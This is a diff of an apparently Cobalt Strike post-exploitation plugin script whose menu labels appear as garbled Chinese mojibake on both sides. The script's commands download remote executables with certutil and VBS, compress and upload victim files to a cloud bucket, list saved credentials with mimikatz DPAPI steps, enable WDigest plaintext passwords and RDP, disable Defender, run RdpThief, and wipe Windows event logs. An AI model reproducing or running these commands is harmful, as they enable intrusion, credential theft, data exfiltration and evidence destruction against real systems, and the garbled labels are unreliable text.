@@ -1,14 +1,14 @@
-menu "¸¨Öú¹¦ÄÜ" {
+menu "è¾…åŠ©åŠŸèƒ½" {
 
-menu "ÏÂÔØÎÄ¼ş" {
+menu "ä¸‹è½½æ–‡ä»¶" {
 	
-item "certutilÏÂÔØÎÄ¼ş" {
+item "certutilä¸‹è½½æ–‡ä»¶" {
     $bid = $1['@'];
-    $dialog = dialog("certutilÔ¶³ÌÏÂÔØ", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
-    dialog_description($dialog, "certutilÃüÁîÔ¶³ÌÎÄ¼şÏÂÔØ¡£");
-    drow_text($dialog, "url", "Ô¶³ÌÎÄ¼şµØÖ·: ");
-    drow_text($dialog, "path", "±¾µØ´¢´æÎÄ¼ş: ");
-    dbutton_action($dialog, "ÔËĞĞ");
+    $dialog = dialog("certutilè¿œç¨‹ä¸‹è½½", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
+    dialog_description($dialog, "certutilå‘½ä»¤è¿œç¨‹æ–‡ä»¶ä¸‹è½½ã€‚");
+    drow_text($dialog, "url", "è¿œç¨‹æ–‡ä»¶åœ°å€: ");
+    drow_text($dialog, "path", "æœ¬åœ°å‚¨å­˜æ–‡ä»¶: ");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub certutil {
@@ -17,13 +17,13 @@ item "certutilÏÂÔØÎÄ¼ş" {
     bshell($bid, "certutil.exe -urlcache -split -f $url $path");
   }
 
-  item "vbsÏÂÔØÎÄ¼ş" {
+  item "vbsä¸‹è½½æ–‡ä»¶" {
     $bid = $1['@'];
-    $dialog = dialog("vbsÏÂÔØÎÄ¼ş", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
-    dialog_description($dialog, "vbs½Å±¾Ô¶³ÌÏÂÔØÎÄ¼ş£¬ÃüÁîĞĞ´«²Î£¬Ö´ĞĞÍê±Ï×Ô¶¯Çå³ıvbsÏÂÔØ½Å±¾¡£");
-    drow_text($dialog, "url", "Ô¶³ÌÎÄ¼şµØÖ·: ");
-    drow_text($dialog, "path", "±¾µØ´¢´æÎÄ¼ş: ");
-    dbutton_action($dialog, "ÔËĞĞ");
+    $dialog = dialog("vbsä¸‹è½½æ–‡ä»¶", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
+    dialog_description($dialog, "vbsè„šæœ¬è¿œç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œå‘½ä»¤è¡Œä¼ å‚ï¼Œæ‰§è¡Œå®Œæ¯•è‡ªåŠ¨æ¸…é™¤vbsä¸‹è½½è„šæœ¬ã€‚");
+    drow_text($dialog, "url", "è¿œç¨‹æ–‡ä»¶åœ°å€: ");
+    drow_text($dialog, "path", "æœ¬åœ°å‚¨å­˜æ–‡ä»¶: ");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub vbs {
@@ -37,13 +37,13 @@ item "certutilÏÂÔØÎÄ¼ş" {
 
 }
 
-item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
+item "SharpZip(å‹ç¼©æ–‡ä»¶å¤¹)" {
     $bid = $1['@'];
-    $dialog = dialog("SharpZipÑ¹Ëõ´ò°üÎÄ¼ş", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
+    $dialog = dialog("SharpZipå‹ç¼©æ‰“åŒ…æ–‡ä»¶", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
     drow_text($dialog, "file", "file:  ");
     drow_text($dialog, "path", "path:  ");
-    dialog_description($dialog, "¶ÔÄ¿Â¼»òÎÄ¼ş½øĞĞÑ¹Ëõ´ò°ü¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpZip");
-    dbutton_action($dialog, "ÔËĞĞ");
+    dialog_description($dialog, "å¯¹ç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå‹ç¼©æ‰“åŒ…ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpZip");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub SharpZip {
@@ -51,16 +51,16 @@ item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
     bexecute_assembly($bid, script_resource("/modules/Assist/SharpZip.exe"), $arg);
   }
 
-  item "SharpOSS(ÉÏ´«ÎÄ¼ş)" {
+  item "SharpOSS(ä¸Šä¼ æ–‡ä»¶)" {
     $bid = $1['@'];
     $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Windows\\Temp\\bak.zip", bid => $bid), &SharpOSS);
-    dialog_description($dialog, "Í¨¹ıaliyun-oss-csharp-sdk¿ìËÙÉÏ´«Ä¿±êÏµÍ³ÎÄ¼şµ½°¢ÀïÔÆOSS¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpOSS");
+    dialog_description($dialog, "é€šè¿‡aliyun-oss-csharp-sdkå¿«é€Ÿä¸Šä¼ ç›®æ ‡ç³»ç»Ÿæ–‡ä»¶åˆ°é˜¿é‡Œäº‘OSSã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpOSS");
     drow_text($dialog, "bucketName", "BucketName: ");
     drow_text($dialog, "accessKeyId", "AccessKeyId: ");
     drow_text($dialog, "accessKeySecret", "AccessKeySecret: ");
     drow_text($dialog, "endpoint", "Endpoint: ");
     drow_text($dialog, "UploadFilePath", "UploadFilePath: ");
-    dbutton_action($dialog, "ÔËĞĞ");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub SharpOSS {
@@ -72,22 +72,22 @@ item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
     $arg = join(' ', @($3['bucketName'],$3['accessKeyId'],$3['accessKeySecret'],$3['endpoint'],$3['UploadFilePath']));
     bexecute_assembly($bid, script_resource("/modules/Assist/SharpOSS.exe"), $arg);
   }
-	item "»ñÈ¡Ô¶³ÌÁ¬½ÓÖ÷»úµÄÃÜÂë" {
-			show_message("Ã»ÓĞ¹ÜÀíÔ±È¨ÏŞ²»ÄÜ¹»»ñÈ¡µ½¼ÓÃÜµÄÃÜÔ¿");
+	item "è·å–è¿œç¨‹è¿æ¥ä¸»æœºçš„å¯†ç " {
+			show_message("æ²¡æœ‰ç®¡ç†å‘˜æƒé™ä¸èƒ½å¤Ÿè·å–åˆ°åŠ å¯†çš„å¯†é’¥");
 			binput($1,"shell cmdkey /list");
 			bshell($1,"cmdkey /list");
-			blog($1,"²é¿´ÓĞÎŞ±£´æµÄÆ¾¾İ");
+			blog($1,"æŸ¥çœ‹æœ‰æ— ä¿å­˜çš„å‡­æ®");
 			binput($1,"shell net user");
 			bshell($1,"net user");
-			blog($1,"²é¿´ÓĞ¶àÉÙÓÃ»§,ÒòÎªÓĞÊ±ºòÆ¾¾İ±£´æ²»ÊÇÔÚ¹ÜÀíÔªÓÃ»§ÖĞ");
+			blog($1,"æŸ¥çœ‹æœ‰å¤šå°‘ç”¨æˆ·,å› ä¸ºæœ‰æ—¶å€™å‡­æ®ä¿å­˜ä¸æ˜¯åœ¨ç®¡ç†å…ƒç”¨æˆ·ä¸­");
 			binput($1,"shell dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*");
 			bshell($1,"dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*");
-			blog($1,"²é¿´±¾µØ±£´æµÄÖ¤Êé");
-			show_message("mimikatz dpapi::cred /in:Â·¾¶»ñÈ¡µ½guidMasterKey\nÔÙÀûÓÃmimikatz sekurlsa::dpapi»ñÈ¡µ½¶ÔÓ¦guidMasterkeyµÄMasterKey\n×îºóÊ¹ÓÃmimikatz dpapi::cred /in:Â·¾¶ /MasterKey:xxx");
+			blog($1,"æŸ¥çœ‹æœ¬åœ°ä¿å­˜çš„è¯ä¹¦");
+			show_message("mimikatz dpapi::cred /in:è·¯å¾„è·å–åˆ°guidMasterKey\nå†åˆ©ç”¨mimikatz sekurlsa::dpapiè·å–åˆ°å¯¹åº”guidMasterkeyçš„MasterKey\næœ€åä½¿ç”¨mimikatz dpapi::cred /in:è·¯å¾„ /MasterKey:xxx");
 	}
 	separator();
 
-	item "¿ªÆôÔ¶³Ì×ÀÃæ" {
+	item "å¼€å¯è¿œç¨‹æ¡Œé¢" {
 	if( -isadmin $1['@'] )
 	{
 		bshell($1,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
@@ -100,13 +100,13 @@ item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
 
 	}
 	separator();
-	item "¿ªÆôÔ¶³Ì×ÀÃæ(Win_Api)" {
+	item "å¼€å¯è¿œç¨‹æ¡Œé¢(Win_Api)" {
 			bupload($1,script_resource("./modules/Assist/reg_open_3389.exe"));
 			bshell($1,"attrib reg_open_3389.exe +s +h");
 			bshell($1,"reg_open_3389.exe");
 	}
 	separator();
-	item "ÆôÓÃWdigest±£´æÃ÷ÎÄ¿ÚÁî" {
+	item "å¯ç”¨Wdigestä¿å­˜æ˜æ–‡å£ä»¤" {
 		if (-isadmin $1["@"])
 		{
 						binput($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
@@ -119,37 +119,37 @@ item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
 		}
 	separator();
 
-  item "×é²ßÂÔ¹Ø±Õdefender" {
+  item "ç»„ç­–ç•¥å…³é—­defender" {
       local('$bid');
       foreach $bid ($1){
         bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
       }
     }
    menu "RdpThief"{
-        item "¿ªÆôRdpthief"{
+        item "å¼€å¯Rdpthief"{
             blog($1, "RdpThief enabled \n");
             add(@beacons,$1,0);
         }
 
-        item "¹Ø±ÕRdpthief"{
+        item "å…³é—­Rdpthief"{
             blog($1, "Disabling RdpThief");
             remove(@beacons,$1);
         }
 
-        item "ÌáÈ¡Rdpthief¼ÇÂ¼"{
+        item "æå–Rdpthiefè®°å½•"{
             bshell($1,"type %temp%\\data.bin");
         }
     }
-	menu "ÈÕÖ¾Çå³ı" {
-  item "Çå³ıÏµÍ³ÈÕÖ¾" {
-    prompt_text("ÔÙ´ÎÈ·ÈÏÇå³ıÏµÍ³ÈÕÖ¾£º", "ÇëÏêÏ¸ÔÄ¶ÁÍøÂç°²È«·¨", lambda({
+	menu "æ—¥å¿—æ¸…é™¤" {
+  item "æ¸…é™¤ç³»ç»Ÿæ—¥å¿—" {
+    prompt_text("å†æ¬¡ç¡®è®¤æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ï¼š", "è¯·è¯¦ç»†é˜…è¯»ç½‘ç»œå®‰å…¨æ³•", lambda({
       bshell(@ids, "wevtutil cl security");
       bshell(@ids, "wevtutil cl system");
       bshell(@ids, "wevtutil cl application");
       bshell(@ids, "wevtutil cl \"windows powershell\"");
     }, @ids => $1));
   }
-  item "½ûÓÃÊÂ¼ş·şÎñ" {
+  item "ç¦ç”¨äº‹ä»¶æœåŠ¡" {
       local('$bid');
       foreach $bid ($1){
         bshell($1, "sc stop Schedule");
@@ -159,7 +159,7 @@ item "SharpZip(Ñ¹ËõÎÄ¼ş¼Ğ)" {
     }
 
 }
-  item "²âÊÔ" {
+  item "æµ‹è¯•" {
     if( -isadmin $1['@'])
     {
       show_message("admin!");
